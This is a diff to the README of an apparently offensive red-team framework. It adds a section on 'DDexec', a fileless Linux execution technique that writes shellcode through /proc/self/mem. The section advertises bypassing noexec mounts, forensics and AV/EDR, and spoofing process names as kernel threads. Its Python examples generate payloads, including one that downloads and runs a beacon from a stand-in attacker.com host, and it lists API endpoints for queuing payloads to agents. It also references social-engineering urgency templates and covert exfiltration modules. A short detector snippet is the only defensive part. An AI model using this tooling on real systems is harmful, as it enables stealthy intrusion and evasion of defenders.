@@ -1159,11 +1159,135 @@ BROWSER DETECTION SCRIPT:
   GET  /social-eng/api/urgency-messages     - Get urgency message templates
 \`\`\`
 
+---
+
+## 👻 DDexec - Fileless Linux Execution (February 2025)
+
+Linux'ta hayalet gibi hareket et. DDexec tekniği /proc/self/mem üzerinden binary'leri disk'e dokunmadan bellekte execute eder. noexec mount'ları bypass, forensic-resistant execution.
+
+### 🔴 DDexec Teknik Detayları
+
+\`\`\`
+┌─────────────────────────────────────────────────────────────────────────────────────────┐
+│                              👻 DDEXEC - GHOST MODE                                      │
+│                Linux'ta /proc/self/mem Üzerinden Fileless Binary Execution              │
+│                         cybermodules/dd_executor.py (~450 lines)                         │
+│                          💀 "Disk'e Dokunma = Hayalet Ol" 💀                             │
+└─────────────────────────────────────────────────────────────────────────────────────────┘
+
+HOW IT WORKS:
+  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+  │ Read return  │ -> │ Open memory  │ -> │ Write stager │ -> │ Stager loads │
+  │ address from │    │   file at    │    │  shellcode   │    │  ELF from    │
+  │ /proc/self/  │    │ /proc/self/  │    │  to hijack   │    │   stdin      │
+  │   syscall    │    │     mem      │    │    shell     │    │              │
+  └──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+          │                   │                    │                  │
+          v                   v                    v                  v
+    Get instruction      exec 7>           printf stager      Binary runs
+    pointer location   /proc/self/mem         >&7           IN MEMORY ONLY!
+
+SUPPORTED ARCHITECTURES:
+  ┌─────────────────────────────────────────────────────────────────┐
+  │  ARCH      │  STAGER SIZE │  SEEKERS                           │
+  ├─────────────────────────────────────────────────────────────────┤
+  │  x86_64    │  ~100 bytes  │  tail, dd, hexdump, cmp, xxd       │
+  │  aarch64   │  ~120 bytes  │  tail, dd, hexdump, cmp, xxd       │
+  └─────────────────────────────────────────────────────────────────┘
+
+SUPPORTED SHELLS:
+  ✅ bash    - Full support
+  ✅ zsh     - Full support (emulate sh mode)
+  ✅ ash     - Busybox support
+
+WHY IT'S DANGEROUS:
+  🔴 noexec mount bypass - Works on /tmp, /dev/shm even if noexec
+  🔴 No disk writes - Binary never touches disk = no IoC files
+  🔴 Process spoofing - argv[0] can be anything: [kworker/0:0]
+  🔴 Forensic resistant - Nothing to find on disk
+  🔴 AV/EDR bypass - No file to scan
+
+PROCESS NAME SPOOFING EXAMPLES:
+  [kworker/0:0]        → Looks like kernel worker thread
+  [migration/0]        → Looks like CPU migration task
+  /usr/sbin/sshd       → Looks like SSH daemon
+  systemd-journald     → Looks like system service
+\`\`\`
+
+### 📦 Usage Examples
+
+\`\`\`python
+from cybermodules.dd_executor import DDExecBuilder
+
+# Initialize builder
+builder = DDExecBuilder(
+    architecture="auto",     # Auto-detect from ELF header
+    seeker="tail",           # Use tail for lseek (default)
+    compress=True            # Gzip compress before base64
+)
+
+# Generate fileless payload
+payload = builder.generate_payload(
+    binary_path="/tmp/beacon",
+    argv0="[kworker/0:0]",   # Fake process name
+    args=["--callback", "10.0.0.1"]
+)
+
+# Execute on target
+# bash -c "payload.command"
+print(payload.command)
+
+# Remote URL execution (wget + DDexec)
+remote_cmd = builder.generate_remote_payload(
+    url="https://attacker.com/beacon.elf",
+    argv0="[migration/0]"
+)
+
+# Direct shellcode execution
+shellcode_cmd = builder.generate_shellcode_payload(
+    shellcode=b"\\x90\\x90...",
+    architecture="x86_64"
+)
+\`\`\`
+
+### 🛡️ Detection Capabilities (Defensive)
+
+\`\`\`python
+from cybermodules.dd_executor import DDExecDetector
+
+# Analyze suspicious command
+result = DDExecDetector.check_command(suspicious_command)
+
+# Returns:
+# {
+#   "is_ddexec": True,
+#   "risk_score": 80,
+#   "findings": [
+#     {"indicator": "/proc/self/mem", "type": "ddexec_technique"},
+#     {"indicator": "exec 7>/proc/self/mem", "type": "ddexec_technique"}
+#   ],
+#   "recommendation": "Investigate process memory modifications"
+# }
+\`\`\`
+
+### 🔗 DDexec API Endpoints
+
+\`\`\`
+  GET  /ddexec/                           - DDexec Dashboard (Ghost Mode UI)
+  GET  /ddexec/api/status                 - Module availability check
+  POST /ddexec/api/generate               - Generate fileless payload from binary
+  POST /ddexec/api/generate-remote        - Generate remote URL payload
+  POST /ddexec/api/generate-shellcode     - Generate shellcode execution payload
+  POST /ddexec/api/detect                 - Analyze command for DDexec indicators
+  POST /ddexec/api/quick                  - Quick payload generation (file upload)
+  POST /ddexec/api/agent/<id>/execute     - Queue DDexec command for agent
+\`\`\`
+
 \`\`\`
 
 ---
 
-## �🕵️ Exotic Exfiltration PRO Modules (February 2025)
+## 🕵️ Exotic Exfiltration PRO Modules (February 2025)
 
 Firewall'ları ve DLP sistemlerini delirtecek covert channel modülleri. Trafik analizi yapılamaz, engellenmesi imkansız.
 
